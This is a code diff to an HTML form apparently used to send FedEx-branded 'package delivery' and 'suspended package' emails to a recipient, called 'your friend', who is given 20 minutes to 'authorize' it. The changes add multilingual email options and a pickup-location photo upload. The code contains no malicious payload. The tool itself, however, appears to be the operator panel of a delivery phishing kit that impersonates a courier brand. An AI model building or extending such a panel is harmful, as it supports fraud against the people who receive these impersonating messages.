@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FedEx Product Delivery System</title>
+    <title>FedEx Package Delivery System</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #4d148c, #6c63ff); min-height: 100vh; }
@@ -49,11 +49,11 @@
     <div class="container">
         <div class="header">
             <h1>📦 FedEx Delivery System</h1>
-            <p>Send product delivery notifications and suspended package alerts</p>
+            <p>Send package delivery notifications and suspended package alerts</p>
         </div>
 
         <div class="form-container">
-            <!-- Regular Product Delivery Form -->
+            <!-- Regular Package Delivery Form -->
             <form id="taskForm" enctype="multipart/form-data">
                 <!-- Recipient Details -->
                 <div class="form-section">
@@ -70,13 +70,27 @@
                     </div>
                 </div>
 
-                <!-- Product Details -->
+                <!-- Language Selection -->
+                <div class="form-section">
+                    <h3>🌐 Email Language</h3>
+                    <div class="form-group">
+                        <label for="emailLanguage">Language for Email Notification</label>
+                        <select id="emailLanguage" name="emailLanguage">
+                            <option value="en" selected>English</option>
+                            <option value="pt-br">Português (Brasil)</option>
+                            <option value="es">Español</option>
+                        </select>
+                        <div class="address-hint">💡 The form stays in English, but the email will be sent in the selected language</div>
+                    </div>
+                </div>
+
+                <!-- Package Details -->
                 <div class="form-section">
                     <h3>📋 Basic Details</h3>
                     <div class="form-grid">
                         <div class="form-group">
-                            <label for="taskName">Product Name *</label>
-                            <input type="text" id="taskName" name="taskName" placeholder="e.g., Complete Project X" required>
+                            <label for="taskName">Package Name *</label>
+                            <input type="text" id="taskName" name="taskName" placeholder="e.g., Electronic Device Package" required>
                         </div>
                         <div class="form-group">
                             <label for="specialId">Special ID (Optional)</label>
@@ -98,14 +112,14 @@
                     </div>
                 </div>
 
-                <!-- Product Image -->
+                <!-- Package Image -->
                 <div class="form-section">
-                    <h3>🖼️ Product Image/Preview</h3>
+                    <h3>🖼️ Package Image/Preview</h3>
                     <div class="form-group">
                         <div class="file-input">
                             <input type="file" id="taskImage" name="taskImage" accept="image/*">
                             <label for="taskImage" class="file-input-label">
-                                📸 Click to upload product image (optional)
+                                📸 Click to upload package image (optional)
                             </label>
                         </div>
                         <div class="file-preview" id="imagePreview"></div>
@@ -139,26 +153,25 @@
                             <input type="text" id="address1" name="address1" placeholder="e.g., 123 Main Street, New York, NY or Victoria Island, Lagos, Nigeria">
                             <div class="address-hint">💡 Enter a specific address, landmark, or location. Maps will be generated for the recipient!</div>
                         </div>
-                        <div class="form-group full-width">
-                            <label for="address2">
-                                <span class="map-icon">🎯</span>Delivery Address
+                    </div>
+                    
+                    <!-- Pickup Location Image -->
+                    <div class="form-group" style="margin-top: 20px;">
+                        <label>
+                            <span class="map-icon">📸</span>Pickup Location Picture (Optional)
+                        </label>
+                        <div class="file-input">
+                            <input type="file" id="pickupLocationImage" name="pickupLocationImage" accept="image/*">
+                            <label for="pickupLocationImage" class="file-input-label">
+                                📸 Click to upload pickup location picture
                             </label>
-                            <input type="text" id="address2" name="address2" placeholder="e.g., 456 Work Plaza, California, USA or Lekki Phase 1, Lagos">
-                            <div class="address-hint">💡 Optional: Enter destination address if different from pickup location</div>
                         </div>
+                        <div class="file-preview" id="pickupLocationPreview"></div>
+                        <div class="address-hint">💡 Upload a picture of the pickup address/location for the recipient to see</div>
                     </div>
                 </div>
 
-                <!-- Message -->
-                <div class="form-section">
-                    <h3>💬 Custom Message</h3>
-                    <div class="form-group">
-                        <label for="message">Message to Recipient</label>
-                        <textarea id="message" name="message" placeholder="Enter a custom message for your friend..."></textarea>
-                    </div>
-                </div>
-
-                <button type="submit" class="submit-btn">📤 Send Product Notification</button>
+                <button type="submit" class="submit-btn">📤 Send Package Notification</button>
             </form>
 
             <div class="loading" id="loading">
@@ -188,6 +201,20 @@
                         <div class="form-group">
                             <label for="suspendedRecipientName">Recipient Name *</label>
                             <input type="text" id="suspendedRecipientName" name="recipientName" required>
+                        </div>
+                    </div>
+
+                    <!-- Language Selection -->
+                    <div class="form-section">
+                        <h3>🌐 Email Language</h3>
+                        <div class="form-group">
+                            <label for="emailLanguage">Language for Email Notification</label>
+                            <select id="emailLanguage" name="emailLanguage">
+                                <option value="en" selected>English</option>
+                                <option value="pt-br">Português (Brasil)</option>
+                                <option value="es">Español</option>
+                            </select>
+                            <div class="address-hint">💡 The form stays in English, but the email will be sent in the selected language</div>
                         </div>
                     </div>
 
@@ -255,11 +282,11 @@
     </div>
 
     <script>
-        // Image preview functionality
+        // Package image preview functionality
         document.getElementById('taskImage').addEventListener('change', function(e) {
             const file = e.target.files[0];
             const preview = document.getElementById('imagePreview');
-            const label = document.querySelector('.file-input-label');
+            const label = document.querySelector('label[for="taskImage"]');
             
             if (file) {
                 const reader = new FileReader();
@@ -270,7 +297,26 @@
                 reader.readAsDataURL(file);
             } else {
                 preview.innerHTML = '';
-                label.textContent = '📸 Click to upload product image (optional)';
+                label.textContent = '📸 Click to upload package image (optional)';
+            }
+        });
+
+        // Pickup location image preview functionality
+        document.getElementById('pickupLocationImage').addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            const preview = document.getElementById('pickupLocationPreview');
+            const label = document.querySelector('label[for="pickupLocationImage"]');
+            
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    preview.innerHTML = `<img src="${e.target.result}" alt="Pickup Location Preview">`;
+                    label.textContent = `✅ ${file.name} selected`;
+                };
+                reader.readAsDataURL(file);
+            } else {
+                preview.innerHTML = '';
+                label.textContent = '📸 Click to upload pickup location picture';
             }
         });
 
@@ -299,14 +345,16 @@
                 if (data.success) {
                     result.innerHTML = `
                         <div class="result-message success">
-                            <h3>✅ Product notification sent successfully!</h3>
+                            <h3>✅ Package notification sent successfully!</h3>
                             <p><strong>Special ID:</strong> ${data.specialId}</p>
                             <p>Your friend will receive the notification with maps shortly and has 20 minutes to authorize it.</p>
                         </div>
                     `;
                     this.reset();
                     document.getElementById('imagePreview').innerHTML = '';
-                    document.querySelector('.file-input-label').textContent = '📸 Click to upload product image (optional)';
+                    document.getElementById('pickupLocationPreview').innerHTML = '';
+                    document.querySelector('label[for="taskImage"]').textContent = '📸 Click to upload package image (optional)';
+                    document.querySelector('label[for="pickupLocationImage"]').textContent = '📸 Click to upload pickup location picture';
                 } else {
                     result.innerHTML = `
                         <div class="result-message error">
@@ -332,7 +380,7 @@
         document.getElementById('suspendedPackageImage').addEventListener('change', function(e) {
             const file = e.target.files[0];
             const preview = document.getElementById('suspendedImagePreview');
-            const label = document.querySelector('[for="suspendedPackageImage"]');
+            const label = document.querySelector('label[for="suspendedPackageImage"]');
             
             if (file) {
                 const reader = new FileReader();
@@ -379,7 +427,7 @@
                     `;
                     this.reset();
                     document.getElementById('suspendedImagePreview').innerHTML = '';
-                    document.querySelector('[for="suspendedPackageImage"]').textContent = '📸 Click to upload package image';
+                    document.querySelector('label[for="suspendedPackageImage"]').textContent = '📸 Click to upload package image';
                 } else {
                     result.innerHTML = `
                         <div class="result-message error">
